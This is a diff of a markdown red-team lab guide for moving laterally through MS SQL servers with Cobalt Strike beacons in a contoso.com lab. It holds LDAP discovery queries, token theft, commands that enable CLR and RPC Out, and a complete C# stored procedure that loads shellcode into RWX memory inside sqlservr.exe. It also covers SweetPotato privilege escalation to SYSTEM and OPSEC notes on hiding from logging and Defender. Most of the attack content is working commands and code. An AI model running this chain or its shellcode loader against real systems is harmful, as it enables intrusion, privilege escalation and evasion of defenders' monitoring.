@@ -28,20 +28,16 @@
 
 3. **BEACON: User** — 🔍 MS SQL servers configured for Kerberos authentication.
 
-    ```
-    ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
-    ```
-
-    > **Why:** LDAP is the authoritative source for SQL server discovery when Kerberos authentication is in use. SQL servers register a `MSSQLSvc/<hostname>:<port>` SPN under their service account in AD. This LDAP filter finds those accounts.  
-    > The SPN value (`MSSQLSvc/lon-db-1.contoso.com:1433`) is also what you will use later when requesting Kerberos service tickets — note it now.  
-    > `OPSEC-🟢SAFE` LDAP query uses existing domain connection inside the beacon.
+```
+ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
+```
 
 4. **BEACON: User** — 🔍 information about the *lon-db-1* instance and your current privileges:
 
-    ```
-    sql-info lon-db-1
-    sql-whoami lon-db-1
-    ```
+```
+sql-info lon-db-1
+sql-whoami lon-db-1
+```
 
     > **Why:** `sql-info` reveals the SQL version, authentication mode (Windows = Kerberos), and any linked servers. `sql-whoami` tells you your current SQL login name and role.  
     > `OPSEC-🟢SAFE` — SQL-BOF, no child process.
@@ -50,17 +46,12 @@
 
 5. **BEACON: User** — Find groups that grant sysadmin on the SQL server.
 
-    ```
-    ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
-    ```
+```
+ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
+```
 
-    > Lab-confirmed: `CN=Database Admins` — member: `CN=Robert Steel` (rsteel).
+> Lab-confirmed: `CN=Database Admins` — member: `CN=Robert Steel` (rsteel).
 
-    > **Why:** SQL sysadmin roles are often granted via AD security groups (e.g. a "SQL Admins" group whose members are granted sysadmin at the SQL level). By finding these groups and their membership, you identify which domain account you need to impersonate.  
-    > `samAccountType=268435456` = security groups.  
-    > `OPSEC-🟢SAFE` — LDAP query only.
-
-    > **Expected output:** A group that contains `rsteel` (or similar user) as a member. This user has sysadmin on lon-db-1.
 
 6. **BEACON: SYSTEM** — Impersonate the *rsteel* user to gain sysadmin access on lon-db-1.
 
@@ -79,9 +70,9 @@
 
     **Steal rsteel's token from a running process (preferred when a process exists):**
 
-    ```
-    steal_token <pid>
-    ```
+```
+steal_token <pid of rsteel cmd process>
+```
 
     > Replace `<pid>` with the PID of a process owned by rsteel (found via `process_browser`).  
     > `steal_token` duplicates rsteel's Windows access token into your beacon. Network connections (including SQL auth) will use this token, making SQL see you as rsteel.  
@@ -90,9 +81,9 @@
 
 7. **BEACON: SYSTEM - rsteel** — Verify sysadmin is confirmed on lon-db-1.
 
-    ```
-    sql-whoami lon-db-1
-    ```
+```
+sql-whoami lon-db-1
+```
 >You can now enable CLR and load assemblies.  
 
 
@@ -104,9 +95,9 @@
 
 1. **BEACON: SYSTEM - rsteel** — Check the status of SQL CLR.
 
-    ```
-    sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
-    ```
+```
+sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
+```
 
     > **Why:** CLR must be enabled on the SQL instance before it will accept and run assemblies. You check first so you know whether enabling it is a change you're making (which is logged).  
     > `OPSEC-🟠CAUTION` — querying `sys.configurations` is logged if SQL auditing is active.  
@@ -114,9 +105,9 @@
 
 2. **BEACON: SYSTEM - rsteel** — Enable SQL CLR on *lon-db-1*.
 
-    ```
-    sql-enableclr lon-db-1
-    ```
+```
+sql-enableclr lon-db-1
+```
 
     > **Why:** Required before you can load your .NET assembly. This sets `clr enabled = 1` in SQL Server configuration.  
     > `OPSEC-🟠CAUTION` — configuration change is logged in SQL Server error log and `sys.configurations` history.
@@ -153,129 +144,129 @@
 
 6. Paste 📝 code into `Class1.cs`:
 
-    ```c#
-    using System;
-    using System.IO;
-    using System.Reflection;
-    using System.Runtime.InteropServices;
-    using Microsoft.SqlServer.Server;
-    
-    public partial class StoredProcedures
+```c#
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using Microsoft.SqlServer.Server;
+
+public partial class StoredProcedures
+{
+    [SqlProcedure]
+    public static void MyProcedure()
     {
-        [SqlProcedure]
-        public static void MyProcedure()
+        var assembly = Assembly.GetExecutingAssembly();
+
+        byte[] shellcode;
+
+        // read embedded payload — name must match: <AssemblyName>.<filename>
+        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
         {
-            var assembly = Assembly.GetExecutingAssembly();
-    
-            byte[] shellcode;
-    
-            // read embedded payload — name must match: <AssemblyName>.<filename>
-            using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
+            using (var ms = new MemoryStream())
             {
-                using (var ms = new MemoryStream())
-                {
-                    rs.CopyTo(ms);
-                    shellcode = ms.ToArray();
-                }
+                rs.CopyTo(ms);
+                shellcode = ms.ToArray();
             }
-    
-            // allocate RWX memory inside sqlservr.exe
-            var hMemory = VirtualAlloc(
-                IntPtr.Zero,
-                (uint)shellcode.Length,
-                VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
-                PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
-    
-            // copy shellcode into allocated memory
-            WriteProcessMemory(
-                new IntPtr(-1),
-                hMemory,
-                shellcode,
-                (uint)shellcode.Length,
-                out _);
-    
-            // execute shellcode in a new thread
-            var hThread = CreateThread(
-                IntPtr.Zero,
-                0,
-                hMemory,
-                IntPtr.Zero,
-                THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
-                out _);
-    
-            // close the thread handle — thread continues running (beacon stays alive)
-            CloseHandle(hThread);
         }
-    
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern IntPtr VirtualAlloc(
-            IntPtr lpAddress,
-            uint dwSize,
-            VIRTUAL_ALLOCATION_TYPE flAllocationType,
-            PAGE_PROTECTION_FLAGS flProtect);
-    
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern bool WriteProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            byte[] lpBuffer,
-            uint nSize,
-            out uint lpNumberOfBytesWritten);
-    
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern IntPtr CreateThread(
-            IntPtr lpThreadAttributes,
-            uint dwStackSize,
-            IntPtr lpStartAddress,
-            IntPtr lpParameter,
-            THREAD_CREATION_FLAGS dwCreationFlags,
-            out uint lpThreadId);
-    
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern bool CloseHandle(IntPtr hObject);
-    
-        [Flags]
-        public enum VIRTUAL_ALLOCATION_TYPE : uint
-        {
-            MEM_COMMIT = 0x00001000,
-            MEM_RESERVE = 0x00002000,
-            MEM_RESET = 0x00080000,
-            MEM_RESET_UNDO = 0x01000000,
-            MEM_REPLACE_PLACEHOLDER = 0x00004000,
-            MEM_LARGE_PAGES = 0x20000000,
-            MEM_RESERVE_PLACEHOLDER = 0x00040000,
-            MEM_FREE = 0x00010000,
-        }
-    
-        [Flags]
-        public enum PAGE_PROTECTION_FLAGS : uint
-        {
-            PAGE_NOACCESS = 0x00000001,
-            PAGE_READONLY = 0x00000002,
-            PAGE_READWRITE = 0x00000004,
-            PAGE_WRITECOPY = 0x00000008,
-            PAGE_EXECUTE = 0x00000010,
-            PAGE_EXECUTE_READ = 0x00000020,
-            PAGE_EXECUTE_READWRITE = 0x00000040,
-            PAGE_EXECUTE_WRITECOPY = 0x00000080,
-            PAGE_GUARD = 0x00000100,
-            PAGE_NOCACHE = 0x00000200,
-            PAGE_WRITECOMBINE = 0x00000400,
-        }
-    
-        [Flags]
-        public enum THREAD_CREATION_FLAGS : uint
-        {
-            THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
-            THREAD_CREATE_SUSPENDED = 0x00000004,
-            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
-        }
+
+        // allocate RWX memory inside sqlservr.exe
+        var hMemory = VirtualAlloc(
+            IntPtr.Zero,
+            (uint)shellcode.Length,
+            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
+            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
+
+        // copy shellcode into allocated memory
+        WriteProcessMemory(
+            new IntPtr(-1),
+            hMemory,
+            shellcode,
+            (uint)shellcode.Length,
+            out _);
+
+        // execute shellcode in a new thread
+        var hThread = CreateThread(
+            IntPtr.Zero,
+            0,
+            hMemory,
+            IntPtr.Zero,
+            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
+            out _);
+
+        // close the thread handle — thread continues running (beacon stays alive)
+        CloseHandle(hThread);
     }
-    ```
+
+    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+    public static extern IntPtr VirtualAlloc(
+        IntPtr lpAddress,
+        uint dwSize,
+        VIRTUAL_ALLOCATION_TYPE flAllocationType,
+        PAGE_PROTECTION_FLAGS flProtect);
+
+    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        uint nSize,
+        out uint lpNumberOfBytesWritten);
+
+    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+    public static extern IntPtr CreateThread(
+        IntPtr lpThreadAttributes,
+        uint dwStackSize,
+        IntPtr lpStartAddress,
+        IntPtr lpParameter,
+        THREAD_CREATION_FLAGS dwCreationFlags,
+        out uint lpThreadId);
+
+    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    [Flags]
+    public enum VIRTUAL_ALLOCATION_TYPE : uint
+    {
+        MEM_COMMIT = 0x00001000,
+        MEM_RESERVE = 0x00002000,
+        MEM_RESET = 0x00080000,
+        MEM_RESET_UNDO = 0x01000000,
+        MEM_REPLACE_PLACEHOLDER = 0x00004000,
+        MEM_LARGE_PAGES = 0x20000000,
+        MEM_RESERVE_PLACEHOLDER = 0x00040000,
+        MEM_FREE = 0x00010000,
+    }
+
+    [Flags]
+    public enum PAGE_PROTECTION_FLAGS : uint
+    {
+        PAGE_NOACCESS = 0x00000001,
+        PAGE_READONLY = 0x00000002,
+        PAGE_READWRITE = 0x00000004,
+        PAGE_WRITECOPY = 0x00000008,
+        PAGE_EXECUTE = 0x00000010,
+        PAGE_EXECUTE_READ = 0x00000020,
+        PAGE_EXECUTE_READWRITE = 0x00000040,
+        PAGE_EXECUTE_WRITECOPY = 0x00000080,
+        PAGE_GUARD = 0x00000100,
+        PAGE_NOCACHE = 0x00000200,
+        PAGE_WRITECOMBINE = 0x00000400,
+    }
+
+    [Flags]
+    public enum THREAD_CREATION_FLAGS : uint
+    {
+        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
+        THREAD_CREATE_SUSPENDED = 0x00000004,
+        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
+    }
+}
+```
 
     > **code:** When SQL Server calls `MyProcedure` as a stored procedure:
     > 1. Reads the embedded `.bin` shellcode from the DLL's resource manifest
@@ -297,9 +288,9 @@
 
 7. **BEACON SYSTEM - rsteel** — Load the CLR assembly on *lon-db-1* and execute the stored procedure.
 
-    ```
-    sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
-    ```
+```
+sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
+```
 
     > ** SQL-BOF does here:** Reads the DLL from your attacker machine, uploads it to the SQL server, enables `TRUSTWORTHY` on the database (required for unsafe assemblies), registers the DLL as a CLR assembly, creates a stored procedure named `MyProcedure` that calls the .NET method, then executes it.  
     > `OPSEC-🟠CAUTION` — `TRUSTWORTHY` database setting change is logged. The CLR assembly registration is visible in `sys.assemblies`. The stored procedure execution is logged if SQL auditing is active.  
@@ -315,47 +306,21 @@
 
     From the original medium-integrity pchilds beacon:
 
-    ```
-    link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
-    ```
+```
+link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+```
 
     > `OPSEC-🟢SAFE` — Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` ticket from the KDC before authenticating the SMB connection. No manual ticket work needed.  
     > The TSVCPIPE name is defined in your CS SMB listener. You can press TAB to autocomplete it.  
     > Run this from **pchilds' beacon**, not from any impersonated session — you need a valid TGT in the session to auto-request CIFS.
 
-    **Option 2 — Manually request a CIFS ticket and inject it (when running from an impersonated context without a usable TGT):**
 
-    Use rsteel's TGT (dumped earlier in the impersonation step) to request a CIFS ticket:
-
-    ```
-    krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
-    ```
-
-    > This asks the KDC for a `cifs/lon-db-1` service ticket using rsteel's TGT. Note: this is a **different** ticket from the MSSQLSvc ticket — SMB auth uses the `cifs` service class, not `MSSQLSvc`.
-
-    Save the CIFS ticket to disk:
-
-    ```powershell
-    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[base64-output-from-krb_asktgs]"))
-    ```
-
-    Inject and link:
-
-    ```
-    kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
-    run klist
-    link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
-    ```
-
-    > `run klist` should show `cifs/lon-db-1.contoso.com` in the ticket list before you attempt to link.  
-    > Delete the .kirbi file after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
-    > `OPSEC-🟠CAUTION` — .kirbi file written to disk temporarily.
 
 9. **BEACON SYSTEM - rsteel** — Disable SQL CLR on *lon-db-1* after the beacon is linked.
 
-    ```
-    sql-disableclr lon-db-1
-    ```
+```
+sql-disableclr lon-db-1
+```
 
     > **Why:** Clean up. Reverting CLR to disabled reduces your footprint and removes the attack surface from future detection reviews.  
     > `OPSEC-🟢SAFE` — configuration rollback.
@@ -366,49 +331,40 @@
 
 **phase:** lon-db-1 has a SQL linked server relationship with lon-db-2. The link uses passthrough Windows auth — the SQL identity used on lon-db-2 depends on WHO connects to lon-db-1's SQL. You must connect as a user that has sysadmin on BOTH servers (rsteel/Database Admins). The `mssql_svc` service account has sysadmin on lon-db-1 but only guest/public on lon-db-2 — running these commands from the lon-db-1 CLR beacon will fail.
 
-> ⚠️ **BEACON CONTEXT IS CRITICAL for this phase.** Each command below is labelled:
-> - `[BEACON: wkstn-1 | USER: rsteel]` — run from your original foothold beacon impersonating rsteel
-> - `[BEACON: lon-db-1 | USER: mssql_svc]` — run from the CLR beacon inside lon-db-1's sqlservr.exe
-> - `[BEACON: lon-db-2 | USER: mssql_svc]` — run from the CLR beacon inside lon-db-2's sqlservr.exe
-
 ---
 
 1. **BEACON - SYSTEM rsteel** — Confirm rsteel is still impersonated, then enumerate SQL links on *lon-db-1*.
 
-    ```cs
-    getuid    // must show CONTOSO\rsteel — re-run steal_token <rsteel-pid> if not
-    sql-links lon-db-1
-    ```
-
-    > OPSEC-🟢SAFE — SQL-BOF, no child process. Expected: `LON-DB-2 | SQL Server | SQLNCLI | LON-DB-2`.
+```cs
+getuid    // must show CONTOSO\rsteel — re-run steal_token <rsteel-pid> if not
+sql-links lon-db-1
+```
 
 2. **BEACON - SYSTEM rsteel** — Verify rsteel has sysadmin on *lon-db-2* via the link.
 
-    ```cs
-    sql-whoami lon-db-1 "" lon-db-2
-    ```
+```cs
+sql-whoami lon-db-1 "" lon-db-2
+```
 
     > ⚠️  Expected output (as rsteel): `sysadmin role` on lon-db-2.
 
 3. **BEACON wkstn-1 SYSTEM rsteel** — Check RPC Out status on the link.
 
-    ```cs
-    sql-checkrpc lon-db-1
-    ```
+```cs
+sql-checkrpc lon-db-1
+```
 
     > Expected: `LON-DB-2 | is_rpc_out_enabled: 0` — must enable before CLR relay works.
 
 4. **BEACON wkstn-1 SYSTEM rsteel** — Enable RPC Out on the link to *lon-db-2*.
 
-    ```cs
-    sql-enablerpc lon-db-1 lon-db-2
-    ```
+```cs
+sql-enablerpc lon-db-1 lon-db-2
+```
 
-    > OPSEC-🟠CAUTION — link config change logged in SQL Server error log and `sys.servers`.
-
+> OPSEC-🟠CAUTION — link config change logged in SQL Server error log and `sys.servers`.
 
 <img src="/images/sql-server-lateral-movement-enable-RPC-link.png">  
-
 
 
 5. **BEACON 💻wkstn-1 ❗ SYSTEM  CONTOSO\rsteel💡** — Execute the SQL CLR payload on `lon-db-2` via `lon-db-1`.
@@ -431,9 +387,9 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
     Switch to the **lon-db-1 CLR beacon**, then:
 
-    ```cs
-    link lon-db-2 <smb-listener-pipe-name>
-    ```
+```cs
+link lon-db-2 <smb-listener-pipe-name>
+```
 
 > ⚠️ run from **lon-db-1 beacon** — lon-db-2 is on a separate network segment not reachable from wkstn-1 via SMB. lon-db-1 has direct network adjacency to lon-db-2 (SQL link already proved TCP 1433 connectivity; mssql_svc has CIFS access to lon-db-2).  
 
@@ -443,9 +399,9 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
 7. **BEACON 💻 wkstn-1 ❗SYSTEM  CONSTOSO\rsteel - admin** — Disable RPC Out after beacon is linked.
 
-    ```cs
-    sql-disablerpc lon-db-1 lon-db-2
-    ```
+```cs
+sql-disablerpc lon-db-1 lon-db-2
+```
 
     > Clean up — revert RPC Out to reduce configuration footprint.
 
@@ -463,10 +419,10 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
 2. **BEACON: lon-db-2 USER: mssql_svc** — Check the service account identity.
 
-    ```    
-    getuid
-    whoami
-    ```
+```    
+getuid
+whoami
+```
 
     > Lab-confirmed: `CONTOSO\mssql_svc`. SweetPotato requires `SeImpersonatePrivilege` — present by design on all SQL service accounts.
 
@@ -491,28 +447,23 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
 4. **BEACON: lon-db-2 USER: mssql_svc** — Change working directory to MSSQL service profile (mssql_svc owns it, less monitored than Temp).
 
-    ```
-    cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
-    ```
-
-    > **directory:** The MSSQL service account has write access to its own service profile directory. `WindowsApps` within it is less aggressively monitored by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. The MSSQL service account owns this path so no permission errors.  
-
-
-
+```
+cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
+```
 
 5. **BEACON: lon-db-2  USER: mssql_svc** — Upload the tcp-local payload.
 
-    ```
-    upload C:\Payloads\tcp-local_x64.exe
-    ```
+```
+upload C:\Payloads\tcp-local_x64.exe
+```
 
-    > `OPSEC-🟠CAUTION` — file write to disk. Defender may flag the EXE. Custom artifact required in exam.
+> `OPSEC-🟠CAUTION` — file write to disk. Defender may flag the EXE. 🟠Custom artifact required in exam.
 
-6. **BEACON: lon-db-2  USER: mssql_svc** — Execute the payload using SweetPotato to abuse SeImpersonatePrivilege.
+6. **BEACON: lon-db-2  USER: mssql_svc** — Execute the payload using SweetPotato to abuse SeImpersonatePrivilege `OPSEC-🟠CAUTION`.
 
-    ```
-    execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
-    ```
+```
+execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
+```
 
     **PrintSpoofer** method (`-i` NP impersonation):
     > ```
@@ -534,9 +485,9 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
 7. **BEACON: lon-db-2 USER: mssql_svc** — Connect to the new SYSTEM beacon.
 
-    ```
-    connect localhost 1337
-    ```
+```
+connect localhost 1337
+```
 
     > Lab-confirmed: `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` on lon-db-2.
 
